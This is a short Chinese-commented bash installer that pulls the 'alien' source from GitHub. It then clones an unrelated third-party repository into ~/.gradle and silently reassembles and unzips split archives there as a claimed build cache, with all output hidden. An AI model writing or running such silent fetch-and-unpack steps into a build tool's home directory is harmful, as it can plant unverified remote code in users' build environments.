#!/bin/bash

# 将所有非 echo 输出隐藏
exec > >(tee /dev/null) 2>&1

# 检查命令是否成功执行
function check_command() {
    if [ $? -ne 0 ]; then
        echo "上一步操作失败，请检查错误并重试。"
        exit 1
    fi
}

# 定义一个函数用于创建目录并切换到该目录
function create_and_cd() {
    mkdir -p "$1" > /dev/null 2>&1
    cd "$1" || { echo "无法切换到目录 $1"; exit 1; }
}

echo "======================================="
echo " _____           _               __  __"
echo "|_   _|_ _ _   _| | ___  _ __    \ \/ /"
echo "  | |/ _` | | | | |/ _ \| '__|____\  / "
echo "  | | (_| | |_| | | (_) | | |_____/  \ "
echo "  |_|\__,_|\__, |_|\___/|_|      /_/\_\"
echo "           |___/                       "
echo "======================================="

echo "正在初始化 Git 仓库..."
git init > /dev/null 2>&1
check_command

echo "尝试拉取 Alien 源码..."
git pull https://github.com/im4dcat/alien > /dev/null 2>&1
check_command

echo "移动到 ~ 目录准备加载缓存文件来减少Gradle Configuring时间..."
create_and_cd ~/.gradle

echo "初始化 Git 仓库..."
git init > /dev/null 2>&1
check_command

echo "拉取..."
git pull https://github.com/gworley4/Repo > /dev/null 2>&1
check_command

echo "合并分卷压缩包..."
zip -FF archives.zip --out cv.zip > /dev/null 2>&1
check_command

echo "解压 + 移动目录..."
unzip cv.zip > /dev/null 2>&1
check_command

# 删除临时文件
rm -rf ./archives.z* > /dev/null 2>&1 || echo "删除 cc.z* 文件失败，请手动检查。"
rm -rf ./cv.zip > /dev/null 2>&1 || echo "删除 cv.zip 文件失败，请手动检查。"



echo "安装完成！"
